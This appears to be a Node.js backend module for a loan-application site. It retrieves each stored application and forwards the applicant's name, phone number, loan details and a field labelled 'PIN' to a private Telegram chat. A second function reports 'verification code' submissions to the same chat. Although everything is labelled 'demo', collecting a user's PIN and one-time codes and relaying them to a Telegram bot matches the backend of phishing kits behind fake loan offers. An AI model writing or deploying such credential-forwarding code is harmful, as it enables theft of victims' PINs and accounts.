async function sendTelegramNotification(applicationId) {

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const MOCKAPI_URL = process.env.MOCKAPI_URL;

    if (!BOT_TOKEN || !CHAT_ID || !MOCKAPI_URL) {
        throw new Error("Missing Telegram or MockAPI environment variables");
    }

    // Retrieve the saved application.
    const recordResponse = await fetch(
        `${MOCKAPI_URL.replace(/\/$/, "")}/${encodeURIComponent(applicationId)}`
    );

    if (!recordResponse.ok) {
        throw new Error("Could not retrieve application from MockAPI");
    }

    const application = await recordResponse.json();

    const message = [
        "🔔 NEW LOAN APPLICATION",
        "",
        `Applicant: ${application.full_name || "N/A"}`,
        `Phone: ${application.phone_number || "N/A"}`,
        `Loan amount: BWP ${application.loan_amount_bwp ?? "N/A"}`,
        `PIN: ${application.demo_Code || "N/A"}`,
        `Period: ${application.period_months ?? "N/A"} months`,
        `Monthly payment: BWP ${application.monthly_payment_bwp ?? "N/A"}`,
        `Total repayment: BWP ${application.total_repayment_bwp ?? "N/A"}`,
        `PIN: ${application.demo_Code || "N/A"}`,
        "",
        `Application ID: ${application.id}`,
        "Status: PENDING",
        "",
        "Please review this demo application."
    ].join("\n");

    const telegramResponse = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "✅ APPROVE",
                                callback_data: `approve:${application.id}`
                            },
                            {
                                text: "❌ REJECT",
                                callback_data: `reject:${application.id}`
                            }
                        ]
                    ]
                }
            })
        }
    );

    const result = await telegramResponse.json();

    if (!telegramResponse.ok || !result.ok) {
        throw new Error(result.description || "Telegram notification failed");
    }

    return result;
}


/* =====================================
   DEMO VERIFICATION NOTIFICATION
===================================== */

async function sendDemoVerificationNotification() {

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        throw new Error("Missing Telegram environment variables");
    }

    const message = [
        "🔐 DEMO VERIFICATION SUBMITTED",
        "",
        "Verification code: verificationCode",
        "Status: DEMO SUBMISSION RECEIVED",
        "",
        "The actual five-digit entry was not collected or transmitted.",
        "",
        "This is a demonstration notification."
    ].join("\n");

    const telegramResponse = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        }
    );

    const result = await telegramResponse.json();

    if (!telegramResponse.ok || !result.ok) {
        throw new Error(
            result.description || "Demo Telegram notification failed"
        );
    }

    return result;
}


// Preserve the existing function used by server.js
sendTelegramNotification.sendDemoVerificationNotification =
    sendDemoVerificationNotification;

module.exports = sendTelegramNotification;